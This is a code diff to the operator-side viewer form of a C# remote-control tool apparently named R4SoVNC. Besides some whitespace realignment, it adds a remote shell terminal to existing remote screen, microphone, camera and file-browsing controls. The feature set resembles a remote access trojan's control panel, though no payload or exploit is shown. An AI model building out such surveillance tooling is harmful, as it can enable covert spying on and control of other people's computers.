@@ -1,7 +1,6 @@
 using System;
 using System.Drawing;
 using System.IO;
-using System.Runtime.InteropServices;
 using System.Windows.Forms;
 using NAudio.Wave;
 using R4SoVNC.Server.Helpers;
@@ -14,14 +13,15 @@ namespace R4SoVNC.Server.Forms
     {
         private readonly ClientSession _session;
         private bool _controlling = false;
-        private bool _micActive = false;
-        private bool _camActive = false;
+        private bool _micActive   = false;
+        private bool _camActive   = false;
         private Size _remoteResolution = new Size(1920, 1080);
 
         private WaveOutEvent? _waveOut;
         private BufferedWaveProvider? _waveBuffer;
-        private CameraForm? _cameraForm;
+        private CameraForm?   _cameraForm;
         private FileTransferForm? _fileTransferForm;
+        private TerminalForm? _terminalForm;
 
         public ViewerForm(ClientSession session)
         {
@@ -30,7 +30,7 @@ namespace R4SoVNC.Server.Forms
             Text = $"R4SoVNC — {session.ClientName} [{session.IpAddress}]";
 
             session.PacketReceived += OnPacketReceived;
-            session.Disconnected += OnSessionDisconnected;
+            session.Disconnected   += OnSessionDisconnected;
 
             pictureBox.MouseMove  += PictureBox_MouseMove;
             pictureBox.MouseDown  += PictureBox_MouseDown;
@@ -48,7 +48,11 @@ namespace R4SoVNC.Server.Forms
             try
             {
                 var wf = new WaveFormat(44100, 16, 1);
-                _waveBuffer = new BufferedWaveProvider(wf) { BufferDuration = TimeSpan.FromSeconds(2), DiscardOnBufferOverflow = true };
+                _waveBuffer = new BufferedWaveProvider(wf)
+                {
+                    BufferDuration = TimeSpan.FromSeconds(2),
+                    DiscardOnBufferOverflow = true
+                };
                 _waveOut = new WaveOutEvent();
                 _waveOut.Init(_waveBuffer);
                 _waveOut.Play();
@@ -68,6 +72,9 @@ namespace R4SoVNC.Server.Forms
                     break;
                 case PacketType.CameraFrame:
                     UpdateCamera(packet.Data);
+                    break;
+                case PacketType.ShellOutput:
+                    _terminalForm?.AppendOutput(packet.GetDataAsString());
                     break;
                 case PacketType.FileListResponse:
                     ShowFileList(packet.GetDataAsString());
@@ -115,7 +122,7 @@ namespace R4SoVNC.Server.Forms
         private Point TranslatePoint(Point p)
         {
             if (pictureBox.Image == null) return p;
-            float scaleX = (float)_remoteResolution.Width / pictureBox.Width;
+            float scaleX = (float)_remoteResolution.Width  / pictureBox.Width;
             float scaleY = (float)_remoteResolution.Height / pictureBox.Height;
             return new Point((int)(p.X * scaleX), (int)(p.Y * scaleY));
         }
@@ -235,6 +242,29 @@ namespace R4SoVNC.Server.Forms
             }
         }
 
+        private void btnShell_Click(object sender, EventArgs e)
+        {
+            if (_terminalForm == null || _terminalForm.IsDisposed)
+            {
+                _terminalForm = new TerminalForm(_session);
+                _terminalForm.FormClosed += (s2, e2) =>
+                {
+                    btnShell.Invoke(() =>
+                    {
+                        btnShell.Text = "⌨ Shell";
+                        btnShell.BackColor = Theme.SurfaceLight;
+                    });
+                };
+                _terminalForm.Show();
+                btnShell.Text = "⌨ Shell ON";
+                btnShell.BackColor = Theme.Warning;
+            }
+            else
+            {
+                _terminalForm.BringToFront();
+            }
+        }
+
         private void btnFileManager_Click(object sender, EventArgs e)
         {
             if (_fileTransferForm == null || _fileTransferForm.IsDisposed)
@@ -243,7 +273,6 @@ namespace R4SoVNC.Server.Forms
                 _fileTransferForm.Show(this);
             }
             else _fileTransferForm.BringToFront();
-
             _session.SendPacket(PacketBuilder.FileListRequest(@"C:\"));
         }
 
@@ -270,12 +299,13 @@ namespace R4SoVNC.Server.Forms
         protected override void OnFormClosing(FormClosingEventArgs e)
         {
             _session.PacketReceived -= OnPacketReceived;
-            _session.Disconnected -= OnSessionDisconnected;
+            _session.Disconnected   -= OnSessionDisconnected;
             if (_micActive) _session.SendPacket(PacketBuilder.MicStop());
             if (_camActive) _session.SendPacket(PacketBuilder.CamStop());
             _waveOut?.Stop();
             _waveOut?.Dispose();
             _cameraForm?.Close();
+            _terminalForm?.Close();
             base.OnFormClosing(e);
         }
     }
